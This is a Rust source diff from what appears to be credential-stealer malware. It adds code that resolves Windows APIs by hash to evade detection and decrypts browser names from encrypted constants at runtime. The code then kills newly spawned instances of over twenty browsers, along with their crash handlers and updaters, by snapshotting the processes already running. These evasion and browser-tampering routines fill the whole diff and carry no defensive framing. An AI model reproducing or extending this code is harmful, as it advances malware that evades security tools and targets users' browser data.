@@ -175,26 +175,137 @@ fn kill_browser_processes(
     }
 }
 
+fn resolve_fns() -> Option<(FnCreateToolhelp32Snapshot, FnProcess32FirstW, FnProcess32NextW, FnOpenProcess, FnTerminateProcess, FnCloseHandle)> {
+    let _k32 = resolve_kernel32()?;
+    let cs: FnCreateToolhelp32Snapshot = unsafe { std::mem::transmute(resolve_fn(H_CreateToolhelp32Snapshot)?) };
+    let pf: FnProcess32FirstW          = unsafe { std::mem::transmute(resolve_fn(H_Process32FirstW)?) };
+    let pn: FnProcess32NextW           = unsafe { std::mem::transmute(resolve_fn(H_Process32NextW)?) };
+    let op: FnOpenProcess              = unsafe { std::mem::transmute(resolve_fn(H_OpenProcess)?) };
+    let term: FnTerminateProcess       = unsafe { std::mem::transmute(resolve_fn(H_TerminateProcess)?) };
+    let ch: FnCloseHandle              = unsafe { std::mem::transmute(resolve_fn(H_CloseHandle)?) };
+    Some((cs, pf, pn, op, term, ch))
+}
+
+/// Snapshot all currently running browser PIDs so we can later kill only
+/// the ones that appeared *after* this snapshot (i.e. spawned by us).
+pub fn snapshot_browser_pids() -> Vec<u32> {
+    let Some((cs, pf, pn, _op, _term, ch)) = resolve_fns() else { return Vec::new() };
+
+    let browser_exes: &[(&[u8], &[u8; 32], &[u8; 12])] = &[
+        (&crate::polymorphic_keys::KILL_CHROME_ENC,    &crate::polymorphic_keys::KILL_CHROME_KEY,    &crate::polymorphic_keys::KILL_CHROME_NONCE),
+        (&crate::polymorphic_keys::KILL_EDGE_ENC,      &crate::polymorphic_keys::KILL_EDGE_KEY,      &crate::polymorphic_keys::KILL_EDGE_NONCE),
+        (&crate::polymorphic_keys::KILL_BRAVE_ENC,     &crate::polymorphic_keys::KILL_BRAVE_KEY,     &crate::polymorphic_keys::KILL_BRAVE_NONCE),
+        (&crate::polymorphic_keys::KILL_VIVALDI_ENC,   &crate::polymorphic_keys::KILL_VIVALDI_KEY,   &crate::polymorphic_keys::KILL_VIVALDI_NONCE),
+        (&crate::polymorphic_keys::KILL_OPERA_ENC,     &crate::polymorphic_keys::KILL_OPERA_KEY,     &crate::polymorphic_keys::KILL_OPERA_NONCE),
+        (&crate::polymorphic_keys::KILL_FIREFOX_ENC,   &crate::polymorphic_keys::KILL_FIREFOX_KEY,   &crate::polymorphic_keys::KILL_FIREFOX_NONCE),
+        (&crate::polymorphic_keys::KILL_WATERFOX_ENC,  &crate::polymorphic_keys::KILL_WATERFOX_KEY,  &crate::polymorphic_keys::KILL_WATERFOX_NONCE),
+        (&crate::polymorphic_keys::KILL_LIBREWOLF_ENC, &crate::polymorphic_keys::KILL_LIBREWOLF_KEY, &crate::polymorphic_keys::KILL_LIBREWOLF_NONCE),
+        (&crate::polymorphic_keys::KILL_YANDEX_ENC,    &crate::polymorphic_keys::KILL_YANDEX_KEY,    &crate::polymorphic_keys::KILL_YANDEX_NONCE),
+        (&crate::polymorphic_keys::KILL_BROWSER_ENC,   &crate::polymorphic_keys::KILL_BROWSER_KEY,   &crate::polymorphic_keys::KILL_BROWSER_NONCE),
+        (&crate::polymorphic_keys::KILL_360CHROME_ENC, &crate::polymorphic_keys::KILL_360CHROME_KEY, &crate::polymorphic_keys::KILL_360CHROME_NONCE),
+        (&crate::polymorphic_keys::KILL_EPIC_ENC,      &crate::polymorphic_keys::KILL_EPIC_KEY,      &crate::polymorphic_keys::KILL_EPIC_NONCE),
+        (&crate::polymorphic_keys::KILL_URAN_ENC,      &crate::polymorphic_keys::KILL_URAN_KEY,      &crate::polymorphic_keys::KILL_URAN_NONCE),
+        (&crate::polymorphic_keys::KILL_7STAR_ENC,     &crate::polymorphic_keys::KILL_7STAR_KEY,     &crate::polymorphic_keys::KILL_7STAR_NONCE),
+        (&crate::polymorphic_keys::KILL_TORCH_ENC,     &crate::polymorphic_keys::KILL_TORCH_KEY,     &crate::polymorphic_keys::KILL_TORCH_NONCE),
+        (&crate::polymorphic_keys::KILL_KOMETA_ENC,    &crate::polymorphic_keys::KILL_KOMETA_KEY,    &crate::polymorphic_keys::KILL_KOMETA_NONCE),
+        (&crate::polymorphic_keys::KILL_ORBITUM_ENC,   &crate::polymorphic_keys::KILL_ORBITUM_KEY,   &crate::polymorphic_keys::KILL_ORBITUM_NONCE),
+        (&crate::polymorphic_keys::KILL_AMIGO_ENC,     &crate::polymorphic_keys::KILL_AMIGO_KEY,     &crate::polymorphic_keys::KILL_AMIGO_NONCE),
+        (&crate::polymorphic_keys::KILL_SPUTNIK_ENC,   &crate::polymorphic_keys::KILL_SPUTNIK_KEY,   &crate::polymorphic_keys::KILL_SPUTNIK_NONCE),
+        (&crate::polymorphic_keys::KILL_COCCOC_ENC,    &crate::polymorphic_keys::KILL_COCCOC_KEY,    &crate::polymorphic_keys::KILL_COCCOC_NONCE),
+        (&crate::polymorphic_keys::KILL_CENT_ENC,      &crate::polymorphic_keys::KILL_CENT_KEY,      &crate::polymorphic_keys::KILL_CENT_NONCE),
+        (&crate::polymorphic_keys::KILL_IRIDIUM_ENC,   &crate::polymorphic_keys::KILL_IRIDIUM_KEY,   &crate::polymorphic_keys::KILL_IRIDIUM_NONCE),
+        (&crate::polymorphic_keys::KILL_SLIMJET_ENC,   &crate::polymorphic_keys::KILL_SLIMJET_KEY,   &crate::polymorphic_keys::KILL_SLIMJET_NONCE),
+    ];
+
+    let mut pids = Vec::new();
+    unsafe {
+        let snap = cs(TH32CS_SNAPPROCESS, 0);
+        if snap.is_null() || snap as isize == -1 { return pids; }
+        let mut entry: PROCESSENTRY32W = PROCESSENTRY32W::default();
+        entry.dw_size = std::mem::size_of::<PROCESSENTRY32W>() as u32;
+        if pf(snap, &mut entry) != 0 {
+            loop {
+                let len = entry.sz_exe_file.iter().position(|&c| c == 0).unwrap_or(260);
+                let exe = String::from_utf16_lossy(&entry.sz_exe_file[..len]).to_lowercase();
+                if exe_matches_any(browser_exes, &exe) {
+                    pids.push(entry.th32_process_id);
+                }
+                if pn(snap, &mut entry) == 0 { break; }
+            }
+        }
+        ch(snap);
+    }
+    pids
+}
+
+/// Kill only browser processes whose PID was NOT present in `before_pids`.
+/// This ensures we only terminate browsers *we* spawned, not ones already open.
+pub fn kill_new_browsers(before_pids: &[u32]) {
+    let Some((cs, pf, pn, op, term, ch)) = resolve_fns() else { return };
+
+    let browser_exes: &[(&[u8], &[u8; 32], &[u8; 12])] = &[
+        (&crate::polymorphic_keys::KILL_CHROME_ENC,    &crate::polymorphic_keys::KILL_CHROME_KEY,    &crate::polymorphic_keys::KILL_CHROME_NONCE),
+        (&crate::polymorphic_keys::KILL_EDGE_ENC,      &crate::polymorphic_keys::KILL_EDGE_KEY,      &crate::polymorphic_keys::KILL_EDGE_NONCE),
+        (&crate::polymorphic_keys::KILL_BRAVE_ENC,     &crate::polymorphic_keys::KILL_BRAVE_KEY,     &crate::polymorphic_keys::KILL_BRAVE_NONCE),
+        (&crate::polymorphic_keys::KILL_VIVALDI_ENC,   &crate::polymorphic_keys::KILL_VIVALDI_KEY,   &crate::polymorphic_keys::KILL_VIVALDI_NONCE),
+        (&crate::polymorphic_keys::KILL_OPERA_ENC,     &crate::polymorphic_keys::KILL_OPERA_KEY,     &crate::polymorphic_keys::KILL_OPERA_NONCE),
+        (&crate::polymorphic_keys::KILL_FIREFOX_ENC,   &crate::polymorphic_keys::KILL_FIREFOX_KEY,   &crate::polymorphic_keys::KILL_FIREFOX_NONCE),
+        (&crate::polymorphic_keys::KILL_WATERFOX_ENC,  &crate::polymorphic_keys::KILL_WATERFOX_KEY,  &crate::polymorphic_keys::KILL_WATERFOX_NONCE),
+        (&crate::polymorphic_keys::KILL_LIBREWOLF_ENC, &crate::polymorphic_keys::KILL_LIBREWOLF_KEY, &crate::polymorphic_keys::KILL_LIBREWOLF_NONCE),
+        (&crate::polymorphic_keys::KILL_YANDEX_ENC,    &crate::polymorphic_keys::KILL_YANDEX_KEY,    &crate::polymorphic_keys::KILL_YANDEX_NONCE),
+        (&crate::polymorphic_keys::KILL_BROWSER_ENC,   &crate::polymorphic_keys::KILL_BROWSER_KEY,   &crate::polymorphic_keys::KILL_BROWSER_NONCE),
+        (&crate::polymorphic_keys::KILL_360CHROME_ENC, &crate::polymorphic_keys::KILL_360CHROME_KEY, &crate::polymorphic_keys::KILL_360CHROME_NONCE),
+        (&crate::polymorphic_keys::KILL_EPIC_ENC,      &crate::polymorphic_keys::KILL_EPIC_KEY,      &crate::polymorphic_keys::KILL_EPIC_NONCE),
+        (&crate::polymorphic_keys::KILL_URAN_ENC,      &crate::polymorphic_keys::KILL_URAN_KEY,      &crate::polymorphic_keys::KILL_URAN_NONCE),
+        (&crate::polymorphic_keys::KILL_7STAR_ENC,     &crate::polymorphic_keys::KILL_7STAR_KEY,     &crate::polymorphic_keys::KILL_7STAR_NONCE),
+        (&crate::polymorphic_keys::KILL_TORCH_ENC,     &crate::polymorphic_keys::KILL_TORCH_KEY,     &crate::polymorphic_keys::KILL_TORCH_NONCE),
+        (&crate::polymorphic_keys::KILL_KOMETA_ENC,    &crate::polymorphic_keys::KILL_KOMETA_KEY,    &crate::polymorphic_keys::KILL_KOMETA_NONCE),
+        (&crate::polymorphic_keys::KILL_ORBITUM_ENC,   &crate::polymorphic_keys::KILL_ORBITUM_KEY,   &crate::polymorphic_keys::KILL_ORBITUM_NONCE),
+        (&crate::polymorphic_keys::KILL_AMIGO_ENC,     &crate::polymorphic_keys::KILL_AMIGO_KEY,     &crate::polymorphic_keys::KILL_AMIGO_NONCE),
+        (&crate::polymorphic_keys::KILL_SPUTNIK_ENC,   &crate::polymorphic_keys::KILL_SPUTNIK_KEY,   &crate::polymorphic_keys::KILL_SPUTNIK_NONCE),
+        (&crate::polymorphic_keys::KILL_COCCOC_ENC,    &crate::polymorphic_keys::KILL_COCCOC_KEY,    &crate::polymorphic_keys::KILL_COCCOC_NONCE),
+        (&crate::polymorphic_keys::KILL_CENT_ENC,      &crate::polymorphic_keys::KILL_CENT_KEY,      &crate::polymorphic_keys::KILL_CENT_NONCE),
+        (&crate::polymorphic_keys::KILL_IRIDIUM_ENC,   &crate::polymorphic_keys::KILL_IRIDIUM_KEY,   &crate::polymorphic_keys::KILL_IRIDIUM_NONCE),
+        (&crate::polymorphic_keys::KILL_SLIMJET_ENC,   &crate::polymorphic_keys::KILL_SLIMJET_KEY,   &crate::polymorphic_keys::KILL_SLIMJET_NONCE),
+    ];
+    let helper_exes: &[(&[u8], &[u8; 32], &[u8; 12])] = &[
+        (&crate::polymorphic_keys::KILL_CHROMEDRIVER_ENC,       &crate::polymorphic_keys::KILL_CHROMEDRIVER_KEY,       &crate::polymorphic_keys::KILL_CHROMEDRIVER_NONCE),
+        (&crate::polymorphic_keys::KILL_GOOGLEUPDATE_ENC,       &crate::polymorphic_keys::KILL_GOOGLEUPDATE_KEY,       &crate::polymorphic_keys::KILL_GOOGLEUPDATE_NONCE),
+        (&crate::polymorphic_keys::KILL_CRASHHANDLER_ENC,       &crate::polymorphic_keys::KILL_CRASHHANDLER_KEY,       &crate::polymorphic_keys::KILL_CRASHHANDLER_NONCE),
+        (&crate::polymorphic_keys::KILL_CRASHPAD_ENC,           &crate::polymorphic_keys::KILL_CRASHPAD_KEY,           &crate::polymorphic_keys::KILL_CRASHPAD_NONCE),
+        (&crate::polymorphic_keys::KILL_BROWSER_BLPOP_ENC,      &crate::polymorphic_keys::KILL_BROWSER_BLPOP_KEY,      &crate::polymorphic_keys::KILL_BROWSER_BLPOP_NONCE),
+        (&crate::polymorphic_keys::KILL_MSEDGE_UPDATE_ENC,      &crate::polymorphic_keys::KILL_MSEDGE_UPDATE_KEY,      &crate::polymorphic_keys::KILL_MSEDGE_UPDATE_NONCE),
+        (&crate::polymorphic_keys::KILL_BRAVE_UPDATE_ENC,       &crate::polymorphic_keys::KILL_BRAVE_UPDATE_KEY,       &crate::polymorphic_keys::KILL_BRAVE_UPDATE_NONCE),
+        (&crate::polymorphic_keys::KILL_OPERA_UPDATE_ENC,       &crate::polymorphic_keys::KILL_OPERA_UPDATE_KEY,       &crate::polymorphic_keys::KILL_OPERA_UPDATE_NONCE),
+        (&crate::polymorphic_keys::KILL_PLUGIN_CONTAINER_ENC,   &crate::polymorphic_keys::KILL_PLUGIN_CONTAINER_KEY,   &crate::polymorphic_keys::KILL_PLUGIN_CONTAINER_NONCE),
+        (&crate::polymorphic_keys::KILL_PLUGIN_CONTAINER64_ENC, &crate::polymorphic_keys::KILL_PLUGIN_CONTAINER64_KEY, &crate::polymorphic_keys::KILL_PLUGIN_CONTAINER64_NONCE),
+        (&crate::polymorphic_keys::KILL_UPDATER_ENC,            &crate::polymorphic_keys::KILL_UPDATER_KEY,            &crate::polymorphic_keys::KILL_UPDATER_NONCE),
+    ];
+
+    unsafe {
+        let snap = cs(TH32CS_SNAPPROCESS, 0);
+        if snap.is_null() || snap as isize == -1 { return; }
+        let mut entry: PROCESSENTRY32W = PROCESSENTRY32W::default();
+        entry.dw_size = std::mem::size_of::<PROCESSENTRY32W>() as u32;
+        if pf(snap, &mut entry) != 0 {
+            loop {
+                let pid = entry.th32_process_id;
+                if !before_pids.contains(&pid) {
+                    let len = entry.sz_exe_file.iter().position(|&c| c == 0).unwrap_or(260);
+                    let exe = String::from_utf16_lossy(&entry.sz_exe_file[..len]).to_lowercase();
+                    if exe_matches_any(browser_exes, &exe) || exe_matches_any(helper_exes, &exe) {
+                        crash_process(op, term, ch, pid);
+                    }
+                }
+                if pn(snap, &mut entry) == 0 { break; }
+            }
+        }
+        ch(snap);
+    }
+}
+
 pub fn kill_browsers() {
-    let Some(_k32) = resolve_kernel32() else { return };
-
-    let create_snap: Option<FnCreateToolhelp32Snapshot> =
-        resolve_fn(H_CreateToolhelp32Snapshot).map(|a| unsafe { std::mem::transmute(a) });
-    let proc_first: Option<FnProcess32FirstW> =
-        resolve_fn(H_Process32FirstW).map(|a| unsafe { std::mem::transmute(a) });
-    let proc_next: Option<FnProcess32NextW> =
-        resolve_fn(H_Process32NextW).map(|a| unsafe { std::mem::transmute(a) });
-    let open_proc: Option<FnOpenProcess> =
-        resolve_fn(H_OpenProcess).map(|a| unsafe { std::mem::transmute(a) });
-    let terminate: Option<FnTerminateProcess> =
-        resolve_fn(H_TerminateProcess).map(|a| unsafe { std::mem::transmute(a) });
-    let close_handle: Option<FnCloseHandle> =
-        resolve_fn(H_CloseHandle).map(|a| unsafe { std::mem::transmute(a) });
-
-    let (Some(cs), Some(pf), Some(pn), Some(op), Some(term), Some(ch)) =
-        (create_snap, proc_first, proc_next, open_proc, terminate, close_handle) else {
-        return;
-    };
+    let Some((cs, pf, pn, op, term, ch)) = resolve_fns() else { return };
 
     kill_browser_processes(cs, pf, pn, op, term, ch);
     std::thread::sleep(std::time::Duration::from_millis(200));
